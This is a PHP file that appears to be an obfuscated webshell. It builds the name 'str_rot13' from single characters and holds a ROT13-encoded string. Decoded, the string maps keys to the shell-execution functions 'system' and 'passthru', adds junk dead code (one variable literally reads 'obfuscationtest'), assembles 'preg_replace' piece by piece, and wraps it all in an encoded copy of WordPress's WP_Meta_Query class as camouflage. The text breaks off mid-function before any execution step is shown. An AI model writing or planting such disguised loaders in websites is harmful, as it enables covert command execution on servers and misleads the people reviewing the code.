<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Zrgn NCV: JC_Zrgn_Dhrel pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Zrgn
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag zrgn dhrevrf sbe gur Zrgn NCV.
 *
 * Hfrq sbe trarengvat FDY pynhfrf gung svygre n cevznel dhrel nppbeqvat gb zrgnqngn xrlf naq inyhrf.
 *
 * JC_Zrgn_Dhrel vf n urycre gung nyybjf cevznel dhrel pynffrf, fhpu nf JC_Dhrel naq JC_Hfre_Dhrel,
 *
 * gb svygre gurve erfhygf ol bowrpg zrgnqngn, ol trarengvat `WBVA` naq `JURER` fhopynhfrf gb or nggnpurq
 * gb gur cevznel FDY dhrel fgevat.
 *
 * @fvapr 3.2.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Zrgn_Dhrel {
	/**
	 * Neenl bs zrgnqngn dhrevrf.
	 *
	 * Frr JC_Zrgn_Dhrel::__pbafgehpg() sbe vasbezngvba ba zrgn dhrel nethzragf.
	 *
	 * @fvapr 3.2.0
	 * @ine neenl
	 */
	choyvp $dhrevrf = neenl();

	/**
	 * Gur eryngvba orgjrra gur dhrevrf. Pna or bar bs 'NAQ' be 'BE'.
	 *
	 * @fvapr 3.2.0
	 * @ine fgevat
	 */
	choyvp $eryngvba;

	/**
	 * Qngnonfr gnoyr gb dhrel sbe gur zrgnqngn.
	 *
	 * @fvapr 4.1.0
	 * @ine fgevat
	 */
	choyvp $zrgn_gnoyr;

	/**
	 * Pbyhza va zrgn_gnoyr gung ercerfragf gur VQ bs gur bowrpg gur zrgnqngn orybatf gb.
	 *
	 * @fvapr 4.1.0
	 * @ine fgevat
	 */
	choyvp $zrgn_vq_pbyhza;

	/**
	 * Qngnonfr gnoyr gung jurer gur zrgnqngn'f bowrpgf ner fgberq (rt $jcqo->hfref).
	 *
	 * @fvapr 4.1.0
	 * @ine fgevat
	 */
	choyvp $cevznel_gnoyr;

	/**
	 * Pbyhza va cevznel_gnoyr gung ercerfragf gur VQ bs gur bowrpg.
	 *
	 * @fvapr 4.1.0
	 * @ine fgevat
	 */
	choyvp $cevznel_vq_pbyhza;

	/**
	 * N syng yvfg bs gnoyr nyvnfrf hfrq va WBVA pynhfrf.
	 *
	 * @fvapr 4.1.0
	 * @ine neenl
	 */
	cebgrpgrq $gnoyr_nyvnfrf = neenl();

	/**
	 * N syng yvfg bs pynhfrf, xrlrq ol pynhfr 'anzr'.
	 *
	 * @fvapr 4.2.0
	 * @ine neenl
	 */
	cebgrpgrq $pynhfrf = neenl();

	/**
	 * Jurgure gur dhrel pbagnvaf nal BE eryngvbaf.
	 *
	 * @fvapr 4.3.0
	 * @ine obby
	 */
	cebgrpgrq $unf_be_eryngvba = snyfr;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 3.2.0
	 * @fvapr 4.2.0 Vagebqhprq fhccbeg sbe anzvat dhrel pynhfrf ol nffbpvngvir neenl xrlf.
	 * @fvapr 5.1.0 Vagebqhprq `$pbzcner_xrl` pynhfr cnenzrgre, juvpu ranoyrf YVXR xrl zngpurf.
	 * @fvapr 5.3.0 Vapernfrq gur ahzore bs bcrengbef ninvynoyr gb `$pbzcner_xrl`. Vagebqhprq `$glcr_xrl`,
	 *              juvpu ranoyrf gur `$xrl` gb or pnfg gb n arj qngn glcr sbe pbzcnevfbaf.
	 *
	 * @cnenz neenl $zrgn_dhrel {
	 *     Neenl bs zrgn dhrel pynhfrf. Jura svefg-beqre pynhfrf be fho-pynhfrf hfr fgevatf nf
	 *     gurve neenl xrlf, gurl znl or ersreraprq va gur 'beqreol' cnenzrgre bs gur cnerag dhrel.
	 *
	 *     @glcr fgevat $eryngvba Bcgvbany. Gur ZlFDY xrljbeq hfrq gb wbva gur pynhfrf bs gur dhrel.
	 *                            Npprcgf 'NAQ' be 'BE'. Qrsnhyg 'NAQ'.
	 *     @glcr neenl  ...$0 {
	 *         Bcgvbany. Na neenl bs svefg-beqre pynhfr cnenzrgref, be nabgure shyyl-sbezrq zrgn dhrel.
	 *
	 *         @glcr fgevat|fgevat[] $xrl         Zrgn xrl be xrlf gb svygre ol.
	 *         @glcr fgevat          $pbzcner_xrl ZlFDY bcrengbe hfrq sbe pbzcnevat gur $xrl. Npprcgf:
	 *                                            - '='
	 *                                            - '!='
	 *                                            - 'YVXR'
	 *                                            - 'ABG YVXR'
	 *                                            - 'VA'
	 *                                            - 'ABG VA'
	 *                                            - 'ERTRKC'
	 *                                            - 'ABG ERTRKC'
	 *                                            - 'EYVXR'
	 *                                            - 'RKVFGF' (nyvnf bs '=')
	 *                                            - 'ABG RKVFGF' (nyvnf bs '!=')
	 *                                            Qrsnhyg vf 'VA' jura `$xrl` vf na neenl, '=' bgurejvfr.
	 *         @glcr fgevat          $glcr_xrl    ZlFDY qngn glcr gung gur zrgn_xrl pbyhza jvyy or PNFG gb sbe
	 *                                            pbzcnevfbaf. Npprcgf 'OVANEL' sbe pnfr-frafvgvir erthyne rkcerffvba
	 *                                            pbzcnevfbaf. Qrsnhyg vf ''.
	 *         @glcr fgevat|fgevat[] $inyhr       Zrgn inyhr be inyhrf gb svygre ol.
	 *         @glcr fgevat          $pbzcner     ZlFDY bcrengbe hfrq sbe pbzcnevat gur $inyhr. Npprcgf:
	 *                                            - '='
	 *                                            - '!='
	 *                                            - '>'
	 *                                            - '>='
	 *                                            - '<'
	 *                                            - '<='
	 *                                            - 'YVXR'
	 *                                            - 'ABG YVXR'
	 *                                            - 'VA'
	 *                                            - 'ABG VA'
	 *                                            - 'ORGJRRA'
	 *                                            - 'ABG ORGJRRA'
	 *                                            - 'ERTRKC'
	 *                                            - 'ABG ERTRKC'
	 *                                            - 'EYVXR'
	 *                                            - 'RKVFGF'
	 *                                            - 'ABG RKVFGF'
	 *                                            Qrsnhyg vf 'VA' jura `$inyhr` vf na neenl, '=' bgurejvfr.
	 *         @glcr fgevat          $glcr        ZlFDY qngn glcr gung gur zrgn_inyhr pbyhza jvyy or PNFG gb sbe
	 *                                            pbzcnevfbaf. Npprcgf:
	 *                                            - 'AHZREVP'
	 *                                            - 'OVANEL'
	 *                                            - 'PUNE'
	 *                                            - 'QNGR'
	 *                                            - 'QNGRGVZR'
	 *                                            - 'QRPVZNY'
	 *                                            - 'FVTARQ'
	 *                                            - 'GVZR'
	 *                                            - 'HAFVTARQ'
	 *                                            Qrsnhyg vf 'PUNE'.
	 *     }
	 * }
	 */
	choyvp shapgvba __pbafgehpg( $zrgn_dhrel = neenl() ) {
		vs ( ! $zrgn_dhrel ) {
			erghea;
		}

		vs ( vffrg( $zrgn_dhrel['eryngvba'] ) && 'BE' === fgegbhccre( $zrgn_dhrel['eryngvba'] ) ) {
			$guvf->eryngvba = 'BE';
		} ryfr {
			$guvf->eryngvba = 'NAQ';
		}

		$guvf->dhrevrf = $guvf->fnavgvmr_dhrel( $zrgn_dhrel );
	}

	/**
	 * Rafherf gur 'zrgn_dhrel' nethzrag cnffrq gb gur pynff pbafgehpgbe vf jryy-sbezrq.
	 *
	 * Ryvzvangrf rzcgl vgrzf naq rafherf gung n 'eryngvba' vf frg.
	 *
	 * @fvapr 4.1.0
	 *
	 * @cnenz neenl $dhrevrf Neenl bs dhrel pynhfrf.
	 * @erghea neenl Fnavgvmrq neenl bs dhrel pynhfrf.
	 */
	choyvp shapgvba fnavgvmr_dhrel( $dhrevrf ) {
		$pyrna_dhrevrf = neenl();

		vs ( ! vf_neenl( $dhrevrf ) ) {
			erghea $pyrna_dhrevrf;
		}

		sbernpu ( $dhrevrf nf $xrl => $dhrel ) {
			vs ( 'eryngvba' === $xrl ) {
				$eryngvba = $dhrel;

			} ryfrvs ( ! vf_neenl( $dhrel ) ) {
				pbagvahr;

				// Svefg-beqre pynhfr.
			} ryfrvs ( $guvf->vf_svefg_beqre_pynhfr( $dhrel ) ) {
				vs ( vffrg( $dhrel['inyhr'] ) && neenl() === $dhrel['inyhr'] ) {
					hafrg( $dhrel['inyhr'] );
				}

				$pyrna_dhrevrf[ $xrl ] = $dhrel;

				// Bgurejvfr, vg'f n arfgrq dhrel, fb jr erphefr.
			} ryfr {
				$pyrnarq_dhrel = $guvf->fnavgvmr_dhrel( $dhrel );

				vs ( ! rzcgl( $pyrnarq_dhrel ) ) {
					$pyrna_dhrevrf[ $xrl ] = $pyrnarq_dhrel;
				}
			}
		}

		vs ( rzcgl( $pyrna_dhrevrf ) ) {
			erghea $pyrna_dhrevrf;
		}

		// Fnavgvmr gur 'eryngvba' xrl cebivqrq va gur dhrel.
		vs ( vffrg( $eryngvba ) && 'BE' === fgegbhccre( $eryngvba ) ) {
			$pyrna_dhrevrf['eryngvba'] = 'BE';
			$guvf->unf_be_eryngvba     = gehr;

			/*
			* Vs gurer vf bayl n fvatyr pynhfr, pnyy gur eryngvba 'BE'.
			* Guvf inyhr jvyy abg npghnyyl or hfrq gb wbva pynhfrf, ohg vg
			* fvzcyvsvrf gur ybtvp nebhaq pbzovavat xrl-bayl dhrevrf.
			*/
		} ryfrvs ( 1 === pbhag( $pyrna_dhrevrf ) ) {
			$pyrna_dhrevrf['eryngvba'] = 'BE';

			// Qrsnhyg gb NAQ.
		} ryfr {
			$pyrna_dhrevrf['eryngvba'] = 'NAQ';
		}

		erghea $pyrna_dhrevrf;
	}

	/**
	 * Qrgrezvarf jurgure n dhrel pynhfr vf svefg-beqre.
	 *
	 * N svefg-beqre zrgn dhrel pynhfr vf bar gung unf rvgure n 'xrl' be
	 * n 'inyhr' neenl xrl.
	 *
	 * @fvapr 4.1.0
	 *
	 * @cnenz neenl $dhrel Zrgn dhrel nethzragf.
	 * @erghea obby Jurgure gur dhrel pynhfr vf n svefg-beqre pynhfr.
	 */
	cebgrpgrq shapgvba vf_svefg_beqre_pynhfr( $dhrel ) {
		erghea vffrg( $dhrel['xrl'] ) || vffrg( $dhrel['inyhr'] );
	}

	/**
	 * Pbafgehpgf n zrgn dhrel onfrq ba 'zrgn_*' dhrel inef
	 *
	 * @fvapr 3.2.0
	 *
	 * @cnenz neenl $di Gur dhrel inevnoyrf.
	 */
	choyvp shapgvba cnefr_dhrel_inef( $di ) {
		$zrgn_dhrel = neenl();

		/*
		 * Sbe beqreol=zrgn_inyhr gb jbex pbeerpgyl, fvzcyr dhrel arrqf gb or
		 * svefg (fb gung vgf gnoyr wbva vf ntnvafg na hanyvnfrq zrgn gnoyr) naq
		 * arrqf gb or vgf bja pynhfr (fb vg qbrfa'g vagresrer jvgu gur ybtvp bs
		 * gur erfg bs gur zrgn_dhrel).
		 */
		$cevznel_zrgn_dhrel = neenl();
		sbernpu ( neenl( 'xrl', 'pbzcner', 'glcr', 'pbzcner_xrl', 'glcr_xrl' ) nf $xrl ) {
			vs ( ! rzcgl( $di[ \"zrgn_$xrl\" ] ) ) {
				$cevznel_zrgn_dhrel[ $xrl ] = $di[ \"zrgn_$xrl\" ];
			}
		}

		// JC_Dhrel frgf 'zrgn_inyhr' = '' ol qrsnhyg.
		vs ( vffrg( $di['zrgn_inyhr'] ) && '' !== $di['zrgn_inyhr'] && ( ! vf_neenl( $di['zrgn_inyhr'] ) || $di['zrgn_inyhr'] ) ) {
			$cevznel_zrgn_dhrel['inyhr'] = $di['zrgn_inyhr'];
		}

		$rkvfgvat_zrgn_dhrel = vffrg( $di['zrgn_dhrel'] ) && vf_neenl( $di['zrgn_dhrel'] ) ? $di['zrgn_dhrel'] : neenl();

		vs ( ! rzcgl( $cevznel_zrgn_dhrel ) && ! rzcgl( $rkvfgvat_zrgn_dhrel ) ) {
			$zrgn_dhrel = neenl(
				'eryngvba' => 'NAQ',
				$cevznel_zrgn_dhrel,
				$rkvfgvat_zrgn_dhrel,
			);
		} ryfrvs ( ! rzcgl( $cevznel_zrgn_dhrel ) ) {
			$zrgn_dhrel = neenl(
				$cevznel_zrgn_dhrel,
			);
		} ryfrvs ( ! rzcgl( $rkvfgvat_zrgn_dhrel ) ) {
			$zrgn_dhrel = $rkvfgvat_zrgn_dhrel;
		}

		$guvf->__pbafgehpg( $zrgn_dhrel );
	}

	/**
	 * Ergheaf gur nccebcevngr nyvnf sbe gur tvira zrgn glcr vs nccyvpnoyr.
	 *
	 * @fvapr 3.7.0
	 *
	 * @cnenz fgevat $glcr ZlFDY glcr gb pnfg zrgn_inyhr.
	 * @erghea fgevat ZlFDY glcr.
	 */
	choyvp shapgvba trg_pnfg_sbe_glcr( $glcr = '' ) {
		vs ( rzcgl( $glcr ) ) {
			erghea 'PUNE';
		}

		$zrgn_glcr = fgegbhccre( $glcr );

		vs ( ! cert_zngpu( '/^(?:OVANEL|PUNE|QNGR|QNGRGVZR|FVTARQ|HAFVTARQ|GVZR|AHZREVP(?:\(\q+(?:,\f?\q+)?\))?|QRPVZNY(?:\(\q+(?:,\f?\q+)?\))?)$/', $zrgn_glcr ) ) {
			erghea 'PUNE';
		}

		vs ( 'AHZREVP' === $zrgn_glcr ) {
			$zrgn_glcr = 'FVTARQ';
		}

		erghea $zrgn_glcr;
	}

	/**
	 * Trarengrf FDY pynhfrf gb or nccraqrq gb n znva dhrel.
	 *
	 * @fvapr 3.2.0
	 *
	 * @cnenz fgevat $glcr              Glcr bs zrgn. Cbffvoyr inyhrf vapyhqr ohg ner abg yvzvgrq
	 *                                  gb 'cbfg', 'pbzzrag', 'oybt', 'grez', naq 'hfre'.
	 * @cnenz fgevat $cevznel_gnoyr     Qngnonfr gnoyr jurer gur bowrpg orvat svygrerq vf fgberq (rt jc_hfref).
	 * @cnenz fgevat $cevznel_vq_pbyhza VQ pbyhza sbe gur svygrerq bowrpg va $cevznel_gnoyr.
	 * @cnenz bowrpg $pbagrkg           Bcgvbany. Gur znva dhrel bowrpg gung pbeerfcbaqf gb gur glcr, sbe
	 *                                  rknzcyr n `JC_Dhrel`, `JC_Hfre_Dhrel`, be `JC_Fvgr_Dhrel`.
	 *                                  Qrsnhyg ahyy.
	 * @erghea fgevat[]|snyfr {
	 *     Neenl pbagnvavat WBVA naq JURER FDY pynhfrf gb nccraq gb gur znva dhrel,
	 *     be snyfr vs ab gnoyr rkvfgf sbe gur erdhrfgrq zrgn glcr.
	 *
	 *     @glcr fgevat $wbva  FDY sentzrag gb nccraq gb gur znva WBVA pynhfr.
	 *     @glcr fgevat $jurer FDY sentzrag gb nccraq gb gur znva JURER pynhfr.
	 * }
	 */
	choyvp shapgvba trg_fdy( $glcr, $cevznel_gnoyr, $cevznel_vq_pbyhza, $pbagrkg = ahyy ) {
		$zrgn_gnoyr = _trg_zrgn_gnoyr( $glcr );
		vs ( ! $zrgn_gnoyr ) {
			erghea snyfr;
		}

		$guvf->gnoyr_nyvnfrf = neenl();

		$guvf->zrgn_gnoyr     = $zrgn_gnoyr;
		$guvf->zrgn_vq_pbyhza = fnavgvmr_xrl( $glcr . '_vq' );

		$guvf->cevznel_gnoyr     = $cevznel_gnoyr;
		$guvf->cevznel_vq_pbyhza = $cevznel_vq_pbyhza;

		$fdy = $guvf->trg_fdy_pynhfrf();

		/*
		 * Vs nal WBVAf ner YRSG WBVAf (nf va gur pnfr bs ABG RKVFGF), gura nyy WBVAf fubhyq
		 * or YRSG. Bgurejvfr cbfgf jvgu ab zrgnqngn jvyy or rkpyhqrq sebz erfhygf.
		 */
		vs ( fge_pbagnvaf( $fdy['wbva'], 'YRSG WBVA' ) ) {
			$fdy['wbva'] = fge_ercynpr( 'VAARE WBVA', 'YRSG WBVA', $fdy['wbva'] );
		}

		/**
		 * Svygref gur zrgn dhrel'f trarengrq FDY.
		 *
		 * @fvapr 3.1.0
		 *
		 * @cnenz fgevat[] $fdy               Neenl pbagnvavat gur dhrel'f WBVA naq JURER pynhfrf.
		 * @cnenz neenl    $dhrevrf           Neenl bs zrgn dhrevrf.
		 * @cnenz fgevat   $glcr              Glcr bs zrgn. Cbffvoyr inyhrf vapyhqr ohg ner abg yvzvgrq
		 *                                    gb 'cbfg', 'pbzzrag', 'oybt', 'grez', naq 'hfre'.
		 * @cnenz fgevat   $cevznel_gnoyr     Cevznel gnoyr.
		 * @cnenz fgevat   $cevznel_vq_pbyhza Cevznel pbyhza VQ.
		 * @cnenz bowrpg   $pbagrkg           Gur znva dhrel bowrpg gung pbeerfcbaqf gb gur glcr, sbe
		 *                                    rknzcyr n `JC_Dhrel`, `JC_Hfre_Dhrel`, be `JC_Fvgr_Dhrel`.
		 */
		erghea nccyl_svygref_ers_neenl( 'trg_zrgn_fdy', neenl( $fdy, $guvf->dhrevrf, $glcr, $cevznel_gnoyr, $cevznel_vq_pbyhza, $pbagrkg ) );
	}

	/**
	 * Trarengrf FDY pynhfrf gb or nccraqrq gb n znva dhrel.
	 *
	 * Pnyyrq ol gur choyvp JC_Zrgn_Dhrel::trg_fdy(), guvf zrgubq vf nofgenpgrq
	 * bhg gb znvagnva cnevgl jvgu gur bgure Dhrel pynffrf.
	 *
	 * @fvapr 4.1.0
	 *
	 * @erghea fgevat[] {
	 *     Neenl pbagnvavat WBVA naq JURER FDY pynhfrf gb nccraq gb gur znva dhrel.
	 *
	 *     @glcr fgevat $wbva  FDY sentzrag gb nccraq gb gur znva WBVA pynhfr.
	 *     @glcr fgevat $jurer FDY sentzrag gb nccraq gb gur znva JURER pynhfr.
	 * }
	 */
	cebgrpgrq shapgvba trg_fdy_pynhfrf() {
		/*
		 * $dhrevrf ner cnffrq ol ersrerapr gb trg_fdy_sbe_dhrel() sbe erphefvba.
		 * Gb xrrc $guvf->dhrevrf hanygrerq, cnff n pbcl.
		 */
		$dhrevrf = $guvf->dhrevrf;
		$fdy     = $guvf->trg_fdy_sbe_dhrel( $dhrevrf );

		vs ( ! rzcgl( $fdy['jurer'] ) ) {
			$fdy['jurer'] = ' NAQ ' . $fdy['jurer'];
		}

		erghea $fdy;
	}

	/**
	 * Trarengrf FDY pynhfrf sbe n fvatyr dhrel neenl.
	 *
	 * Vs arfgrq fhodhrevrf ner sbhaq, guvf zrgubq erphefrf gur gerr gb
	 * cebqhpr gur cebcreyl arfgrq FDY.
	 *
	 * @fvapr 4.1.0
	 *
	 * @cnenz neenl $dhrel Dhrel gb cnefr (cnffrq ol ersrerapr).
	 * @cnenz vag   $qrcgu Bcgvbany. Ahzore bs gerr yriryf qrrc jr pheeragyl ner.
	 *                     Hfrq gb pnyphyngr vaqragngvba. Qrsnhyg 0.
	 * @erghea fgevat[] {
	 *     Neenl pbagnvavat WBVA naq JURER FDY pynhfrf gb nccraq gb n fvatyr dhrel neenl.
	 *
	 *     @glcr fgevat $wbva  FDY sentzrag gb nccraq gb gur znva WBVA pynhfr.
	 *     @glcr fgevat $jurer FDY sentzrag gb nccraq gb gur znva JURER pynhfr.
	 * }
	 */
	cebgrpgrq shapgvba trg_fdy_sbe_dhrel( &$dhrel, $qrcgu = 0 ) {
		$fdy_puhaxf = neenl(
			'wbva'  => neenl(),
			'jurer' => neenl(),
		);

		$fdy = neenl(
			'wbva'  => '',
			'jurer' => '',
		);

		$vaqrag = '';
		sbe ( $v = 0; $v < $qrcgu; $v++ ) {
			$vaqrag .= '  ';
		}

		sbernpu ( $dhrel nf $xrl => &$pynhfr ) {
			vs ( 'eryngvba' === $xrl ) {
				$eryngvba = $dhrel['eryngvba'];
			} ryfrvs ( vf_neenl( $pynhfr ) ) {

				// Guvf vf n svefg-beqre pynhfr.
				vs ( $guvf->vf_svefg_beqre_pynhfr( $pynhfr ) ) {
					$pynhfr_fdy = $guvf->trg_fdy_sbe_pynhfr( $pynhfr, $dhrel, $xrl );

					$jurer_pbhag = pbhag( $pynhfr_fdy['jurer'] );
					vs ( ! $jurer_pbhag ) {
						$fdy_puhaxf['jurer'][] = '';
					} ryfrvs ( 1 === $jurer_pbhag ) {
						$fdy_puhaxf['jurer'][] = $pynhfr_fdy['jurer'][0];
					} ryfr {
						$fdy_puhaxf['jurer'][] = '( ' . vzcybqr( ' NAQ ', $pynhfr_fdy['jurer'] ) . ' )';
					}

					$fdy_puhaxf['wbva'] = neenl_zretr( $fdy_puhaxf['wbva'], $pynhfr_fdy['wbva'] );
					// Guvf vf n fhodhrel, fb jr erphefr.
				} ryfr {
					$pynhfr_fdy = $guvf->trg_fdy_sbe_dhrel( $pynhfr, $qrcgu + 1 );

					$fdy_puhaxf['jurer'][] = $pynhfr_fdy['jurer'];
					$fdy_puhaxf['wbva'][]  = $pynhfr_fdy['wbva'];
				}
			}
		}

		// Svygre gb erzbir rzcgvrf.
		$fdy_puhaxf['wbva']  = neenl_svygre( $fdy_puhaxf['wbva'] );
		$fdy_puhaxf['jurer'] = neenl_svygre( $fdy_puhaxf['jurer'] );

		vs ( rzcgl( $eryngvba ) ) {
			$eryngvba = 'NAQ';
		}

		// Svygre qhcyvpngr WBVA pynhfrf naq pbzovar vagb n fvatyr fgevat.
		vs ( ! rzcgl( $fdy_puhaxf['wbva'] ) ) {
			$fdy['wbva'] = vzcybqr( ' ', neenl_havdhr( $fdy_puhaxf['wbva'] ) );
		}

		// Trarengr n fvatyr JURER pynhfr jvgu cebcre oenpxrgf naq vaqragngvba.
		vs ( ! rzcgl( $fdy_puhaxf['jurer'] ) ) {
			$fdy['jurer'] = '( ' . \"\a  \" . $vaqrag . vzcybqr( ' ' . \"\a  \" . $vaqrag . $eryngvba . ' ' . \"\a  \" . $vaqrag, $fdy_puhaxf['jurer'] ) . \"\a\" . $vaqrag . ')';
		}

		erghea $fdy;
	}

	/**
	 * Trarengrf FDY WBVA naq JURER pynhfrf sbe n svefg-beqre dhrel pynhfr.
	 *
	 * \"Svefg-beqre\" zrnaf gung vg'f na neenl jvgu n 'xrl' be 'inyhr'.
	 *
	 * @fvapr 4.1.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz neenl  $pynhfr       Dhrel pynhfr (cnffrq ol ersrerapr).
	 * @cnenz neenl  $cnerag_dhrel Cnerag dhrel neenl.
	 * @cnenz fgevat $pynhfr_xrl   Bcgvbany. Gur neenl xrl hfrq gb anzr gur pynhfr va gur bevtvany `$zrgn_dhrel`
	 *                             cnenzrgref. Vs abg cebivqrq, n xrl jvyy or trarengrq nhgbzngvpnyyl.
	 *                             Qrsnhyg rzcgl fgevat.
	 * @erghea neenl {
	 *     Neenl pbagnvavat WBVA naq JURER FDY pynhfrf gb nccraq gb n svefg-beqre dhrel.
	 *
	 *     @glcr fgevat[] $wbva  Neenl bs FDY sentzragf gb nccraq gb gur znva WBVA pynhfr.
	 *     @glcr fgevat[] $jurer Neenl bs FDY sentzragf gb nccraq gb gur znva JURER pynhfr.
	 * }
	 */
	choyvp shapgvba trg_fdy_sbe_pynhfr( &$pynhfr, $cnerag_dhrel, $pynhfr_xrl = '' ) {
		tybony $jcqo;

		$fdy_puhaxf = neenl(
			'jurer' => neenl(),
			'wbva'  => neenl(),
		);

		vs ( vffrg( $pynhfr['pbzcner'] ) ) {
			$pynhfr['pbzcner'] = fgegbhccre( $pynhfr['pbzcner'] );
		} ryfr {
			$pynhfr['pbzcner'] = vffrg( $pynhfr['inyhr'] ) && vf_neenl( $pynhfr['inyhr'] ) ? 'VA' : '=';
		}

		$aba_ahzrevp_bcrengbef = neenl(
			'=',
			'!=',
			'YVXR',
			'ABG YVXR',
			'VA',
			'ABG VA',
			'RKVFGF',
			'ABG RKVFGF',
			'EYVXR',
			'ERTRKC',
			'ABG ERTRKC',
		);

		$ahzrevp_bcrengbef = neenl(
			'>',
			'>=',
			'<',
			'<=',
			'ORGJRRA',
			'ABG ORGJRRA',
		);

		vs ( ! va_neenl( $pynhfr['pbzcner'], $aba_ahzrevp_bcrengbef, gehr ) && ! va_neenl( $pynhfr['pbzcner'], $ahzrevp_bcrengbef, gehr ) ) {
			$pynhfr['pbzcner'] = '=';
		}

		vs ( vffrg( $pynhfr['pbzcner_xrl'] ) ) {
			$pynhfr['pbzcner_xrl'] = fgegbhccre( $pynhfr['pbzcner_xrl'] );
		} ryfr {
			$pynhfr['pbzcner_xrl'] = vffrg( $pynhfr['xrl'] ) && vf_neenl( $pynhfr['xrl'] ) ? 'VA' : '=';
		}

		vs ( ! va_neenl( $pynhfr['pbzcner_xrl'], $aba_ahzrevp_bcrengbef, gehr ) ) {
			$pynhfr['pbzcner_xrl'] = '=';
		}

		$zrgn_pbzcner     = $pynhfr['pbzcner'];
		$zrgn_pbzcner_xrl = $pynhfr['pbzcner_xrl'];

		// Svefg ohvyq gur WBVA pynhfr, vs bar vf erdhverq.
		$wbva = '';

		// Jr cersre gb nibvq wbvaf vs cbffvoyr. Ybbx sbe na rkvfgvat wbva pbzcngvoyr jvgu guvf pynhfr.
		$nyvnf = $guvf->svaq_pbzcngvoyr_gnoyr_nyvnf( $pynhfr, $cnerag_dhrel );
		vs ( snyfr === $nyvnf ) {
			$v     = pbhag( $guvf->gnoyr_nyvnfrf );
			$nyvnf = $v ? 'zg' . $v : $guvf->zrgn_gnoyr;

			// WBVA pynhfrf sbe ABG RKVFGF unir gurve bja flagnk.
			vs ( 'ABG RKVFGF' === $zrgn_pbzcner ) {
				$wbva .= \" YRSG WBVA $guvf->zrgn_gnoyr\";
				$wbva .= $v ? \" NF $nyvnf\" : '';

				vs ( 'YVXR' === $zrgn_pbzcner_xrl ) {
					$wbva .= $jcqo->cercner( \" BA ( $guvf->cevznel_gnoyr.$guvf->cevznel_vq_pbyhza = $nyvnf.$guvf->zrgn_vq_pbyhza NAQ $nyvnf.zrgn_xrl YVXR %f )\", '%' . $jcqo->rfp_yvxr( $pynhfr['xrl'] ) . '%' );
				} ryfr {
					$wbva .= $jcqo->cercner( \" BA ( $guvf->cevznel_gnoyr.$guvf->cevznel_vq_pbyhza = $nyvnf.$guvf->zrgn_vq_pbyhza NAQ $nyvnf.zrgn_xrl = %f )\", $pynhfr['xrl'] );
				}

				// Nyy bgure WBVA pynhfrf.
			} ryfr {
				$wbva .= \" VAARE WBVA $guvf->zrgn_gnoyr\";
				$wbva .= $v ? \" NF $nyvnf\" : '';
				$wbva .= \" BA ( $guvf->cevznel_gnoyr.$guvf->cevznel_vq_pbyhza = $nyvnf.$guvf->zrgn_vq_pbyhza )\";
			}

			$guvf->gnoyr_nyvnfrf[] = $nyvnf;
			$fdy_puhaxf['wbva'][]  = $wbva;
		}

		// Fnir gur nyvnf gb guvf pynhfr, sbe shgher fvoyvatf gb svaq.
		$pynhfr['nyvnf'] = $nyvnf;

		// Qrgrezvar gur qngn glcr.
		$_zrgn_glcr     = vffrg( $pynhfr['glcr'] ) ? $pynhfr['glcr'] : '';
		$zrgn_glcr      = $guvf->trg_pnfg_sbe_glcr( $_zrgn_glcr );
		$pynhfr['pnfg'] = $zrgn_glcr;

		// Snyyonpx sbe pynhfr xrlf vf gur gnoyr nyvnf. Xrl zhfg or n fgevat.
		vs ( vf_vag( $pynhfr_xrl ) || ! $pynhfr_xrl ) {
			$pynhfr_xrl = $pynhfr['nyvnf'];
		}

		// Rafher havdhr pynhfr xrlf, fb abar ner birejevggra.
		$vgrengbe        = 1;
		$pynhfr_xrl_onfr = $pynhfr_xrl;
		juvyr ( vffrg( $guvf->pynhfrf[ $pynhfr_xrl ] ) ) {
			$pynhfr_xrl = $pynhfr_xrl_onfr . '-' . $vgrengbe;
			++$vgrengbe;
		}

		// Fgber gur pynhfr va bhe syng neenl.
		$guvf->pynhfrf[ $pynhfr_xrl ] =& $pynhfr;

		// Arkg, ohvyq gur JURER pynhfr.

		// zrgn_xrl.
		vs ( neenl_xrl_rkvfgf( 'xrl', $pynhfr ) ) {
			vs ( 'ABG RKVFGF' === $zrgn_pbzcner ) {
				$fdy_puhaxf['jurer'][] = $nyvnf . '.' . $guvf->zrgn_vq_pbyhza . ' VF AHYY';
			} ryfr {
				/**
				 * Va wbvarq pynhfrf artngvir bcrengbef unir gb or arfgrq vagb n
				 * ABG RKVFGF pynhfr naq syvccrq, gb nibvq ergheavat erpbeqf jvgu
				 * zngpuvat cbfg VQf ohg qvssrerag zrgn xrlf. Urer jr cercner gur
				 * arfgrq pynhfr.
				 */
				vs ( va_neenl( $zrgn_pbzcner_xrl, neenl( '!=', 'ABG VA', 'ABG YVXR', 'ABG RKVFGF', 'ABG ERTRKC' ), gehr ) ) {
					// Artngvir pynhfrf znl or erhfrq.
					$v                     = pbhag( $guvf->gnoyr_nyvnfrf );
					$fhodhrel_nyvnf        = $v ? 'zg' . $v : $guvf->zrgn_gnoyr;
					$guvf->gnoyr_nyvnfrf[] = $fhodhrel_nyvnf;

					$zrgn_pbzcner_fgevat_fgneg  = 'ABG RKVFGF (';
					$zrgn_pbzcner_fgevat_fgneg .= \"FRYRPG 1 SEBZ $jcqo->cbfgzrgn $fhodhrel_nyvnf \";
					$zrgn_pbzcner_fgevat_fgneg .= \"JURER $fhodhrel_nyvnf.cbfg_VQ = $nyvnf.cbfg_VQ \";
					$zrgn_pbzcner_fgevat_raq    = 'YVZVG 1';
					$zrgn_pbzcner_fgevat_raq   .= ')';
				}

				fjvgpu ( $zrgn_pbzcner_xrl ) {
					pnfr '=':
